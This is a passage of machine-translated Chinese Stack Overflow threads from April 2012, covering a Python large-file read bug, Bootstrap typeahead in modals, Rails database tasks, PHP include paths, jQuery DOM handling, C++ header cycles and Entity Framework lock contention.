> 现在，错误的解释；重现并不容易，因为它取决于内部 FILE 缓冲区大小和传递给 fread() 的字符数。在 Microsoft CRT 源代码中的 open.c 中，有一个块以这种令人鼓舞的评论开头“这是困难的部分。我们在缓冲区末尾发现了一个 CR。我们必须先看看下一个字符是否是 LF。 " 奇怪的是，在 Perl 源代码中有这个函数的几乎完全相同的副本：http://perl5.git.perl.org/perl.git/blob/4342f4d6df6a7dfa22a470aa21e54a5622c009f3: [/win32/win32.c#l3668](http://perl5.git.perl.org/perl.git/blob/4342f4d6df6a7dfa22a470aa21e54a5622c009f3:/win32/win32.c#l3668) 问题在于对 SetFilePointer() 的调用，用于在前瞻后后退一个位置；它将失败，因为它无法以 32 位 DWORD 返回当前位置。[修复很容易；你看到了吗？] 此时，函数认为下一个 read() 将返回 LF，但它不会，因为文件指针没有移回。

解决方法：

> 但请注意，Python 3.x 不受影响（原始文件始终以二进制模式打开，CRLF 翻译由 Python 完成）；对于 2.7，您可以使用 io.open()。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-19T02:45:17.273

4GB 标记可疑地接近可以存储在 32 位寄存器 (2**32) 中的最大值。

您发布的代码本身看起来不错，所以我怀疑您的 Python 构建中存在错误。

*FWIW，如果使用enumerate*，该片段会更干净一些：

```
inputFileHandle = open(inputFileName, 'r')

for row, line in enumerate(inputFileHandle):
    if line_meets_condition:
        outputFileHandle.write(line)
    else:
        lstIgnoredRows.append(row) 
```

# twitter-bootstrap - Bootstrap typeahead 在 Bootstrap 模式中不起作用

> ID：10220866
> 
> 赞同：12
> 
> 时间：2012-04-19T02:31:39.620
> 
> 标签：twitter-bootstrap, bootstrap-typeahead

我正在使用 codeigniter 框架，我正在使用 bootstrap typeahead，一切都很好，但我的问题是当我将它放在 bootstrap 模式中时，bootstrap typeahead 将不起作用。有人能帮我吗？请。这是我的代码

```
<a data-target="ajaxify" data-toggle="modal" href="<?php echo base_url()?>task/add_task" class="no-u quick-task">
    <h4>Task</h4>
    <span>This is a simple description</span>
 </a> 
```

在我的 add_task 控制器中，我调用了视图 task_view.php 和 task.js，但似乎预输入在引导模式中不起作用。

这是 task.js 的内容

```
$(document).ready(function(){
$("#assign_to").typeahead({
    source: [{value: 'Charlie'}, {value: 'Gudbergur'}]              
});
}); 
```

这是 task_view.php 的内容：只是一个示例。

```
<div id="ajaxx" class="modal hide fade">
<div class="modal-header">
  <a class="close" data-dismiss="modal">&times;</a>
  <!--Your title here -->
  <h3>Modal Heading</h3>

</div>
<div class="modal-body">
<form><input type="text" name="assign_to" id="assign_to" /></form>
</div>
<div class="modal-footer">
  <!--Your dont change the attributes only the value here -->
  <a href="#" id="n0" class="btn n0" data-dismiss="modal">Close</a>
  <a href="#" id="y1" class="btn btn-primary y1" data-submit="modal">Save</a>
</div> 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-19T13:25:21.103

您需要在 .typeahead 上放置一个 1051 的 z-index 以使其显示在模态 div 上方。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-19T05:07:30.207

编辑`bootstrap-typeahead.js`：

```
 this.$menu.css({
    top: pos.top + pos.height,
    left: pos.left,
    'z-index': 9999 //maximum z-index
  }) 
```

找到最高的 z-index： http: [//archive.plugins.jquery.com/project/TopZIndex](http://archive.plugins.jquery.com/project/TopZIndex)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-10-22T16:17:18.763

我不知道我是否遇到了稍微不同的版本特定问题，但我使用的是 bootstrap 2.3.2 并且没有版本的 z-index 对我有用。我找到了另一个最终有效的解决方案：

```
.modal-body{overflow-y: inherit;} 
```

在[https://github.com/twbs/bootstrap/issues/1078](https://github.com/twbs/bootstrap/issues/1078)找到，由 jgutix 回答

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-02-18T08:34:00.177

确保删除 typeahead-append-to-body="true"

[https://github.com/angular-ui/bootstrap/issues/3262](https://github.com/angular-ui/bootstrap/issues/3262)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-05-20T14:04:58.040

我在我的自定义 css 中使用以下

```
.modal-body{overflow-y: inherit;}

.modal-open .dropdown-menu {
  z-index: 2050;
} 
```

[使用的工作示例](http://www.bootply.com/kj7GJf0b87#)

# ruby-on-rails - 在什么情况下会在 rails (db) 中发生这种情况？

> ID：10220871
> 
> 赞同：0
> 
> 时间：2012-04-19T02:32:12.477
> 
> 标签：ruby-on-rails, ruby

对这个烂摊子感到非常困惑：

```
rake db:drop
>
rake db:create
> my_database already exists
rake db:migrate
> unknown database my_database 
```

欣赏任何见解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T05:54:06.643

那是因为当你第一次执行 rake db:create 时，它​​会创建两个数据库，一个是开发数据库，​​另一个是测试数据库。然后，当您执行 rake db:drop 时，它会删除数据库，但它只会删除开发数据库而不是测试数据库。所以尝试显式删除测试数据库，一切都应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T05:38:37.987

尝试 ：

```
rake db:drop
rake db:create RAILS_ENV=development
rake db:migrate RAILS_ENV=development 
```

如果遇到同样的错误，则打开 mysql 终端并手动创建数据库：

```
CREATE DATABASE database_name; 
```

然后运行

```
rake db:migrate 
```

# vba - Visual Basic OpenLinks Excel

> ID：10220872
> 
> 赞同：1
> 
> 时间：2012-04-19T02:32:25.413
> 
> 标签：vba, excel

使用以下代码在我的文档的 A 列中打开一堆链接，希望在打开链接后等待 3 秒，然后移至下一个，而不是打开新窗口或选项卡，我希望它只使用该窗口已经打开了。

```
Sub OpenLinks()

For Each vCell In Range("A2:A" & Cells(Rows.Count, "A").End(xlUp).Row)
Set oIE = CreateObject("InternetExplorer.Application")
oIE.Visible = True
oIE.Navigate (vCell.Value)
Next vCell

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:39:55.640

试试这个：

```
Sub OpenLinks()

Set oIE = CreateObject("InternetExplorer.Application")

For Each vCell In Range("A2:A" & Cells(Rows.Count, "A").End(xlUp).Row)
    oIE.Visible = True
    oIE.Navigate (vCell.Value)
    Application.Wait (Now + TimeValue("0:00:3"))
Next vCell

End Sub 
```

但是，与往常一样，我建议您考虑使用 With/End With 而不是 Set。

```
Sub OpenLinks()  

With CreateObject("InternetExplorer.Application")

For Each vCell In Range("A2:A" & Cells(Rows.Count, "A").End(xlUp).Row)
    .Visible = True
    .Navigate (vCell.Value)
    Application.Wait (Now + TimeValue("0:00:3"))
Next vCell

End With

End Sub 
```

# amazon-web-services - 在亚马逊AWS中在哪里存储10kb的文本？

> ID：10220874
> 
> 赞同：1
> 
> 时间：2012-04-19T02:32:30.450
> 
> 标签：amazon-web-services, amazon-s3, amazon-simpledb

这些将在诸如 SO 问题之类的 Web 应用程序中被编入索引并随机访问。SimpleDB 每个属性有 1024 字节的限制，但您可以使用多个 attrs 但听起来不优雅。

**示例：**博客文章；脸书状态信息；食谱（在博客应用程序中；类似 facebook 的应用程序；食谱网站）。

如果我要在 Amazon AWS 上构建这样的应用程序，我应该在哪里/如何存储这些文本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T20:06:30.023

使用 S3，您可以将所有实际文件放在 S3 中，然后使用 Amazon RDS 或 Heroku 上的 Postgres 或当时适合您的任何工具对它们进行索引。

此外，您可以让客户端直接从 S3 下载多 kB 文本简介，这样您的应用程序就可以将 URL 传递给消息，从而创建一个大规模并行服务器 - 即使主服务器只是一台机器上的单个线程，从 S3 资产 URL 构建页面。S3 可以存储所有资产，如图像等。

优点很大。这也解决了备份等问题，并允许您使用许多索引和搜索方案。例如，可以使用 Google 进行搜索...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T07:37:26.613

我想说你会想看看 Amazon RDS，它在云中运行像 MySQL 这样的关系数据库。单个 DynamoDB 读取容量单元只能（始终）[读取 1kb-item](http://aws.amazon.com/dynamodb/faqs/#What_is_a_read/write_capacity_unit_How_do_I_estimate_how_many_read_and_write_capacity_units_I_need_for_my_application)，这可能不适合您。

或者，您可以将文本文件存储在 S3 中，并将指向这些文件的指针放在 SimpleDB 中。这取决于许多更具成本效益的因素：您每天添加多少文件，这些文件预计多久更改一次，请求它们的频率等。

就个人而言，我认为使用 S3 并不是最好的方法。如果您将所有问题和答案存储在单独的文本文件中，您会看到许多请求，即使是显示一个简单的页面。更不用说搜索了，这需要您从 S3 中获取所有文件并搜索它们。因此，对于搜索，无论如何您都需要一个数据库。

您可以使用 SDB 来保存索引，但坦率地说，我只会在 Amazon RDS 上使用 MySQL（我认为现在有两个月的免费试用期），在那里您可以做关系数据库可以做的所有好事，以及还提供对全文搜索的支持。RDS 应该能够每天扩展到大量访问者：您可以轻松扩展到具有 68 GB 内存和 26 个 ECU 的高内存四倍超大型数据库实例。

据我所知，SO 也是建立在关系数据库之上的：[https ://blog.stackoverflow.com/2008/09/what-was-stack-overflow-built-with/](https://blog.stackoverflow.com/2008/09/what-was-stack-overflow-built-with/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T08:19:46.383

DynamoDB 可能是您想要的，他们的文档中甚至还有一个论坛用例：[Amazon DynamoDB 中的示例表和数据](http://docs.amazonwebservices.com/amazondynamodb/latest/developerguide/SampleTablesAndData.html)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-20T19:28:16.423

问题中没有足够的信息来为“我应该将要使用的文本存储在哪里？”提供一个合理的答案。

根据您构建应用程序的方式以及对速度、冗余、延迟、容量、可扩展性、大小、成本、健壮性、可靠性、可搜索性、可修改性、安全性等的要求，答案可能是：

*   删除附加到实例的 EBS 卷上的文件中的文本。

*   将文本放入 MySQL 或 RDS 数据库。

*   将文本放入分布在多个实例中的分布式文件系统中。

*   将文本上传到 S3

*   将文本存储在 SimpleDB 中

*   将文本存储在 DynamoDB 中

*   在 ElastiCache 中缓存文本

这方面还有许多变体，例如将主副本存储在 S3 中、在 ElastiCache 和本地磁盘中缓存副本、使用 DynamoDB 中的特定键对其进行索引并使其可在 Cloud Search 中搜索。

# matlab - Matlab 大字体图形中的排版问题

> ID：10220880
> 
> 赞同：0
> 
> 时间：2012-04-19T02:33:07.013
> 
> 标签：matlab, matlab-figure, typesetting

我正在为演示准备一个简单的 Matlab 图。因此，我需要图例的字体很大。这会导致下标排版出现一些问题，如下所示。

![下标排版错误](../Images/40be6a7631bfcde668fef37f0dea19f6.png)

我对 E 和 M 和下标零之间的大空间有疑问。过去我通过保存图像并随后在 GIMP 中使用它来克服这个问题；但是，我有几个这样的图像，并希望以更自动化的方式进行此操作。

无论如何，有没有从 Matlab 中获得更好的排版？特别是，我可以在下标之前强制减少空格吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:48:14.860

我实际上无法重现该问题。这是我用来创建该图例的代码：

```
figure;
plot(randn(10,4))
h = legend(...
    'Approximate Model solution M_0 = 1e5', ...
    'Full Model solution M_0 = 1e5', ...
    'Approximate Model solution E_0 = 1e5', ...
    'Full Model solution E_0 = 1e5'); 
```

对我来说，它的渲染没有你在图片中显示的额外间距。

* * *

如果你真的需要对间距进行微调，可以尝试使用 Latex 来添加一些负的水平空间，如下所示：

对于标题：

```
title('abc\hspace{-1pt}efg','interpreter','latex') 
```

对于一个传奇：

```
warning off MATLAB:tex              %Disable a warning cause by the next line ... 
h = legend('abc\hspace{-1pt}efg');  %... there may be a cleaner way 
set(h,'interpreter','latex'); 
```

# php - 错误 500 Require_once

> ID：10220882
> 
> 赞同：2
> 
> 时间：2012-04-19T02:33:11.687
> 
> 标签：php, apache, require-once

这是我的一段 php 代码：

```
<?php
require_once 'php/Classes/User/UserDataBaseManager.php';
require_once 'facebook/src/facebook.php';
?> 
```

当我尝试在 http:/mydomain/myfile.php 中浏览此代码时，浏览器会返回错误 500。

阿帕奇日志说：

`[Wed Apr 18 20:38:07 2012] [error] [client 190.50.81.189] PHP Fatal error: require_once() [<a href='function.require'>function.require</a>]: Failed opening required 'php/classes/DataBase/DataBaseManager.php' (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/virtuales/blyxo.com/php/Classes/User/UserDataBaseManager.php`

解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:01:57.687

这在我看来是文件 UserDatabaseManager.php 试图包含 DataBaseManager.php 但它提供了错误的路径。您的 apache 错误表明它将首先查看`.`当前目录，`/usr/share/pear`然后`/usr/share/php`

您的 DataBasemanger.php 文件不在最后两个文件中。当它尝试查看当前目录时，它包括您的相对路径。因此，当您的 UserDataBaseManager.php 文件（位于 中`php/Classes/User/`）提供该路径时，apache 最终会在其中查找您的 DataBaseManager.php 文件`php/Classes/User/php/classes/DataBase/DataBaseManager.php`

有几种方法可以解决这个问题。您可以获取文档根目录并将其添加到每个包含这样的文件中

```
$root = $_SERVER['DOCUMENT_ROOT'];
require_once($root . "/php/classes/DataBase/DataBaseManager.php"); 
```

或者，如果此应用程序处于受控环境中并且您可以编辑 php.ini 文件，您可以定义包含路径以也查看`/var/www/virtuales/blyxo.com/php/Classes/`并仅包含文件

```
require_once("Database/DataBaseManager.php"); 
```

更好的解决方案可能是定义一个 __autoload 函数，每次您尝试实例化一个新对象时都会调用该函数，并让它使用一些逻辑来查找要包含的文件。这个解决方案需要更多的重组，但您可能会考虑它。这是定义您自己的自动加载器的文档[http://us2.php.net/manual/en/function.autoload.php](http://us2.php.net/manual/en/function.autoload.php)

我知道还有其他方法可以做到这一点。让我知道什么对你有用！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:48:42.860

你可以试试

```
<?php require_once(dirname(__FILE__) . "php/Classes/User/UserDataBaseManager.php");?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T02:41:37.283

尝试

`echo getcwd();`

找到解决任何路径相关问题的工作路径。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-12-23T15:43:03.763

我检查了 Apache `error.log`，发现我`dbname`的 in有问题`dbconn.php`，

```
PHP Fatal error:  Uncaught PDOException: SQLSTATE[HY000] [1049] Unknown database 'study_db' 
```

然后我更正了数据库名称，它开始工作。

# javascript - javascript - 当数据为空时无法创建输入

> ID：10220883
> 
> 赞同：0
> 
> 时间：2012-04-19T02:33:12.857
> 
> 标签：javascript

我有一个示例代码

```
<script type="text/javascript">
function remove_news(id) {
    try {
        $('news_list').removeChild($('news_'+id));
        $('news_list').removeChild($('input_news_'+id));
        if($('news_list') == '') {
            var input = document.createElement('input');
            input.setAttribute("type", "hidden");
            input.setAttribute("name", "news_id");
            input.setAttribute("value", "0");
            document.getElementById("news_list").appendChild(input);
        }
    } catch(err){}
}
</script>
<div id="news_list">
<div id='news_1'> News no 1 <a href='#' onclick='remove_news(1); return false;'>[Delete]</a></div>
<input type="hidden" id="input_news_1" name="news_id" value="1" />
</div> 
```

当我运行代码时，选择删除链接结果不显示`<input type="hidden" name="news_id" value="0" />`

如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:37:24.930

您需要使用`#news_id`, 等作为 jQuery 选择器`#`：

```
try {
    $('#news_list').removeChild($('#news_'+id));
    $('#news_list').removeChild($('#input_news_'+id));
    if($('#news_list').html() == '') {
        var input = document.createElement('input');
        input.setAttribute("type", "hidden");
        input.setAttribute("name", "news_id");
        input.setAttribute("value", "0");
        document.getElementById("news_list").appendChild(input);
    }
 } catch(err){} 
```

但是，您不必混合使用 jQuery 和常规 JavaScript。由于您使用的是 jQuery，因此您不妨使用所有 jQuery。我不保证上述方法会奏效。

```
try {
    // Instead of removing a child node, just remove the element directly:
    $('#news_'+id).remove()
    $('#input_news_'+id).remove();
    if($('#news_list').html() == '') {
        var input = $.create("<input type='hidden' name='news_id' value='0'>");
        $('#news_list').append(input);
    }
 } catch(err){} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:54:53.103

一些评论：

```
> function remove_news(id) {
>      try { 
```

绝对不需要 try..catch 这里。防御性地编码，而不是在填充单元格中。

```
>          $('news_list').removeChild($('news_'+id));
>          $('news_list').removeChild($('input_news_'+id)); 
```

您似乎在 jQuery 和纯 javascript 之间存在冲突，所以：

```
 var news_list = document.getElementById('news_' + id);
  news_list && news_list.parentNode.removeChild(news_list);

  var input_news_list = document.getElementById('input_news_' + id);
  input_news_list && input_news_list.parentNode.removeChild(input_news_list);

> 
>          if($('news_list') == '') { 
```

您刚刚从 DOM 中删除了该元素，因此您不会在那里找到它。将它与空字符串进行比较也是一个糟糕的选择，我认为这是一个测试元素是否在文档中。由于它是不必要的，它可以被删除。

```
>              var input = document.createElement('input');
>              input.setAttribute("type", "hidden");
>              input.setAttribute("name", "news_id");
>              input.setAttribute("value", "0"); 
```

如果您只想清除价值，为什么还要这样做？无论如何，放弃 setAttribute 调用并直接设置属性更简单：

```
 var input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'news_id';
  input.value = '0';

>              document.getElementById("news_list").appendChild(input);
>          }     
>     } catch(err){}  } 
```

Ih HTML（为方便起见我的包装）：

```
> <div id='news_1'> News no 1 <a href='#' onclick='remove_news(1);
>  return false;'>[Delete]</a></div> 
```

当你不想要一个 A 元素时，为什么要使用它？使用跨度并适当地设置它的样式（或者，天堂禁止，一个按钮）：

```
<div ...><span onclick="remove_news(1);">...</span></div> 
```

您可以通过使用 div 的 id 使函数更通用，这样您就不必在调用中传递它。然后，您可能只需将一个侦听器附加到一个祖先，该祖先查看点击的来源并从那里进行处理（即委托）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T02:44:56.603

如果我理解正确，并且看到您使用 jQuery：

```
function remove_news(id) {
    var newsList = $('#news_list');          //cache news list

    $('#news_'+id,newsList).remove();       //then remove the news
    $('#input_news_'+id,newsList).remove(); //as well as the accompanying input

    if(newsList.length){                    //and if there is no news left
        $('<input type="hidden">').attr({   //create a hidden input
            'name':'news_id',               
            'value':'0'
        }).appendTo(newsList);              //and append to list
    }
} 
```

的解释`$('<input type="hidden">')`是[IE 不支持进行动态输入更改](http://api.jquery.com/attr/#attr2)，例如`$('<input>').attr({'type':'hidden'})`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T02:40:54.267

如果要检查对象是否存在，请不要将 jQuery 对象与空字符串进行比较。

```
if($('news_list') == '') { ...} 
```

检查非零长度。正如其他人提到的那样，您似乎缺少哈希来识别您的元素。

```
if($('#news_list').length == 0) { ...} 
```

此外，这个 if 语句中的逻辑似乎有缺陷。您检查是否`news_list`存在，然后您尝试在最后一行中通过相同的 id 获取一个元素。很难说，因为正如我提到的，您正在根据字符串查询对象。那没有意义。

```
 if($('news_list') == '') {
        var input = document.createElement('input');
        input.setAttribute("type", "hidden");
        input.setAttribute("name", "news_id");
        input.setAttribute("value", "0");
        document.getElementById("news_list").appendChild(input); //doesn't exist?
    } 
```

# c++ - C++ 如何将整数转换为字符串？

> ID：10220885
> 
> 赞同：5
> 
> 时间：2012-04-19T02:33:16.313
> 
> 标签：c++, visual-c++

> **可能重复：**
> [替代 itoa() 将整数转换为字符串 C++？](https://stackoverflow.com/questions/228005/alternative-to-itoa-for-converting-integer-to-string-c)

如何在 C++ 中将整数更改为字符串？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T02:40:59.150

标准 C++ 库风格：

```
#include <sstream>
#include <string>

(...)

int number = 5;
std::stringstream ss;
ss << number;
std::string numberAsString(ss.str()); 
```

或者，如果您有幸使用 C++11：

```
#include <string>

(...)

int number = 5;
std::string numberAsString = std::to_string(number); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:38:10.587

您可以使用`snprintf(char *str, size_t size, const char *format, ...)`获取 char[]，然后使用`string(char*)`获取字符串。当然，还有其他方法。

# c++ - 如何避免头文件重复？

> ID：10220886
> 
> 赞同：2
> 
> 时间：2012-04-19T02:33:41.213
> 
> 标签：c++

在我的程序中，我得到了两个名为“invader.h”和“game.h”的头文件。在 game.h 中我包含了invader.h，因为我想将当前游戏实例的指针传递给一个入侵者实例。我还在invader.h 中包含了game.h，但是我得到了编译错误。如果我从invader.h 中删除game.h，它工作正常。我已经在每个头文件中添加了包含保护。根据我目前发现的情况，我在invader.h中添加了一个游戏类的前向声明，因为我需要的是一个指向invancer.h中游戏实例的指针。但是当我想在invader.cpp中调用一个游戏函数时，它说不允许指向不完整类类型的指针。我应该怎么做才能解决这个问题？

游戏.h

```
#ifndef GAME_H
#define GAME_H
#include "Tank.h"
#include "Invader.h"
#include "Block.h"
#include "Bullet.h"

class Game
{
private:
Tank tank;
Invader invaders[11][5];
Block blocks[4];
bool logicRequiredThisLoop = false;
public:
Game();
void initEntities();
Tank* getTank(){return &tank;};
Invader* getInvaders(){return &invaders[0][0];};
Block* getBlocks(){return &blocks[0];};
void updateLogic();
};
#endif 
```

入侵者.h

```
#ifndef INVADER_H
#define INVADER_H
#include "Entity.h"
class Game; //forward declaration of class Game
class Invader: public Entity
{
private:
Game* game;
public:
Invader(){};
Invader(Game*,char*,int,int,int,int,int,int);
void move(long delta);
void doLogic();
};
#endif 
```

入侵者.cpp

```
#include "Invader.h"
Invader::Invader(Game* game,char* sprite,int x,int y,int dx,int dy,int width,int height):Entity(sprite,x,y,dx,dy,width,height)
{
this->game = game;
}

void Invader::move(long delta)
{
if ((dx<0)&&(x<=10))
{
    game->updateLogic();
}
if ((dx>0)&&(x>=390))
{
    dx = -dx;
    y -= dy;
}

x+=dx;
} 
```

在 Invader.cpp 中，当我尝试调用作为 Game 类的成员函数的 updateLogic() 时，出现错误，指出不允许指向不完整类的指针

其实简单来说，我在这里想知道的最基本的事情是：在我的代码中，游戏类有一个入侵者类型的成员变量，那么我如何在入侵者类中调用游戏类的成员函数？li，我说如果我包含入侵者.h 在 Game.h 中并在 Invader.h 中包含 Gameh.h 会发生编译错误。

这就是我在 Invader.h 中包含 Game.h 时得到的结果：

```
1>ClCompile:
1>  Invader.cpp
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(13): error C2146: syntax error : missing ';' before identifier 'invaders'
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(13): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(13): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(21): error C2143: syntax error : missing ';' before '*'
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(21): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(21): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(21): warning C4183: 'getInvaders': missing return type; assumed to be a member function returning 'int'
1>c:\users\tony\documents\info3220\spaceinvader\spaceinvader\basicwogl\game.h(21): error C2065: 'invaders' : undeclared identifier 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:46:22.110

**我应该怎么做才能解决这个问题？**
首先了解不完整类型的含义：

**[是什么导致类型不完整？](https://stackoverflow.com/a/10108786/452307)**

如果您不能在类型不完整的情况下使用前向声明，那么您应该重新访问您的设计，因为那里有问题。

如果您需要更详细的答案，则需要提供源代码。

**编辑：**
您需要包含`Game.h`在`Invader.cpp`.

**//入侵者.cpp**

```
#include "Invader.h"
#include "Game.h" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:42:02.133

我将参考我现在本地盒子里的两个文件来解释这一点。

`server.h`和`worker.h`

服务器.h：

```
#ifndef SERVER_H_
#define SERVER_H_

typedef struct _conf conf;
typedef struct _worker worker;
typedef struct _logger logger;

typedef struct _server server;
struct _server {
    /* config */
    conf *cfg;

    /* socket */
    int fd;
    struct event_base *base;
    struct event *signal;

    /* workers */
    worker **w;

    /* log */
    logger *log;
};
...
...
#endif /* SERVER_H_ */ 
```

工人.h

```
#ifndef WORKER_H_
#define WORKER_H_

#include <pthread.h>

typedef struct _server server;

typedef struct _worker worker;
struct _worker {
    pthread_t t;

    struct event_base *base;
    struct evhttp *http;

    server *s;
};
...
...
#endif /* WORKER_H_ */ 
```

如您所见，服务器结构和工作结构都相互引用，这可以通过`.h`文件顶部的前向声明来解决：例如

```
typedef struct _worker worker; 
```

at top of`server.h`足以让它引用 worker 结构。您可能需要在此处查看完整文件以供进一步参考：[https ://github.com/abhinavsingh/pulsar/tree/master/include](https://github.com/abhinavsingh/pulsar/tree/master/include)

希望有帮助。

# .net - EntityFramework 4.1 CodeFirst Monitor.Enter

> ID：10220888
> 
> 赞同：1
> 
> 时间：2012-04-19T02:33:59.790
> 
> 标签：.net, performance, asp.net-mvc-3, transactions, entity-framework-4.1

我对 EF 4.1 有疑问。我们以一种方法在项目中发现了性能问题，我开始使用 dotTrace 来解决该问题，并且发现了这种奇怪的行为： ![在此处输入图像描述](../Images/115db9e313c24626715b38410bc51391.png)

当应用程序启动时 - 一切正常，首先调用该方法工作正常，但后来每次我在现场执行一些操作时，花费在 Monitor.Enter 上的时间都会增加。

我知道问题在于锁定，这意味着某些东西阻止了调用，但我不知道那里发生了什么。如果我有 EF 4.1 的源代码，我可以尝试调试整个事情，但这是我要做的最后一件事。您能否给我一些提示在哪里看，什么可能会影响这种行为？我首先想到的当然是交易，但我找不到这个项目中使用的任何交易，至少是明确的！欢迎您写下您的任何想法，因为我在互联网上找不到任何类似的问题。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T09:12:03.980

这是一个很有趣的问题。我只是在 Reflector .NET 的帮助下进行了小型快速分析（您也可以使用 ILSpy、JustDecompile 或 DotPeek 来查看任何未混淆的 .NET 源代码）。分析可能不正确或基于不正确的假设，因此请将其考虑在内。

让我们从`InitializeDatabaseAction`：

```
private void InitializeDatabaseAction(Action<InternalContext> action)
{
    Func<Tuple<DbCompiledModel, string>, RetryAction<InternalContext>> valueFactory = null;
    if (!this._inDatabaseInitialization)
    {
        try
        {
            this._inDatabaseInitialization = true;
            if (valueFactory == null)
            {
                // Delegate to create a new instance of RetryAction
                valueFactory = t => new RetryAction<InternalContext>(action);
            }
            // InitializeDatabases is ConcurrentDictionary - it stores information
            // about all compiled models and they related database connection strings
            // This call will try to get existing RetryAction for the model and if
            // it doesn't exists it will use current valueFactory to create
            // a new instance and add it to dictionary. It will also return
            // that value and execute its PerformAction operation.
            // If you have just one context and one database you will have only
            // single record in the concurrent dictionary but every creation
            // of your DbContext will go through this call to ensure that database
            // is initialized. This code is executed when your context is used
            // for data retrieval or persistence for the first time.
            InitializedDatabases.GetOrAdd(Tuple.Create<DbCompiledModel, string>(this._model, this._internalConnection.ConnectionKey), valueFactory).PerformAction(this);
        }
        finally
        {
            this._inDatabaseInitialization = false;
        }
    }
} 
```

现在让我们检查`RetryAction`类：

```
/// <summary>
/// Adapted from Lazy<> to allow the initializer to take an input object and 
/// to do one-time initialization that only has side-effects and doesn't 
/// return a value. 
/// </summary>
internal class RetryAction<TInput>
{
    // Fields
    private Action<TInput> _action;
    private readonly object _lock;

    // Methods
    public RetryAction(Action<TInput> action)
    {
        this._lock = new object();
        this._action = action;
    }

    /// <summary>
    /// Performs the action unless it has already been successfully 
    /// performed before. 
    /// </summary> 
    public void PerformAction(TInput input)
    {
        // Here we have Monitor.Enter
        lock (this._lock)
        {
            if (this._action != null)
            {
                Action<TInput> action = this._action;
                this._action = null;
                try
                {
                    action(input);
                }
                catch (Exception)
                {
                    this._action = action;
                    throw;
                }
            }
        }
    }
} 
```

如果您有许多并发线程（您的 ASP.NET MVC 应用程序负载很重）并且您正在创建大量 DbContext 实例，那么`lock`执行中的操作对于您的吞吐量来说确实是一个问题。我相信这可以被视为一个错误，并且它具有非常简单的修复，可以在大多数情况下提高吞吐量：

```
public void PerformAction(TInput input)
{     
    // This is known as Double-Checked Locking  
    if (this._action != null)
    {
        lock (this._lock)
        {
            if (this._action != null)
            { 
                ...
            }
        }
    }
} 
```

跟踪中的第二个问题遵循相同的问题。

我建议您再次验证这确实是您的问题的根源（对于一些调用来说应该不是问题，因为锁争用是重负载的问题）并在[MS Connect](http://connect.microsoft.com/)上打开错误或将其发布到[ADO.NET 团队](http://blogs.msdn.com/b/adonet/contact.aspx)。您可以参考这篇文章作为问题的描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-21T19:46:58.793

我在我们的代码中发现了一个问题。一如既往，对一切产生巨大影响的小事业。

正如我已经说过的，在应用程序中存在一个奇怪的问题——对 MVC 应用程序的每次调用，因此对 EntityFramework 的调用都在单独的 AppDomain 中。EF CodeFirst 为每个 AppDomain 构建和编译模型一次，在我的情况下，它每次都在构建和编译模型，因为它是一个单独的 AppDomain。原因很简单，其他团队中的某个人已将文件系统日志记录添加到被调用的程序集，并且对该程序集的类的每次调用都会更改文件并且 WebServer 正在重新启动应用程序。我刚刚关闭了日志记录，它解决了问题。现在我没有这个性能问题。

# python - IMAPLib fetch 函数每三次尝试失败一次

> ID：10220890
> 
> 赞同：1
> 
> 时间：2012-04-19T02:34:26.373
> 
> 标签：python, imaplib

我遇到了一个奇怪的问题，即 imaplib 的 fetch 函数每三次尝试都会失败。我正在从术语列表中选择一个搜索词，然后使用该搜索词从 gmail 邮箱中提取包含该词的电子邮件列表。然后我选择一条随机消息，并拉出包含搜索词的行。每第三次运行脚本时，我都会收到以下错误：

```
Traceback (most recent call last):
File "/Users/Spike/python/helloflask/venv/lib/python2.7/site-packages/flask/app.py", line 1518, in __call__
return self.wsgi_app(environ, start_response)
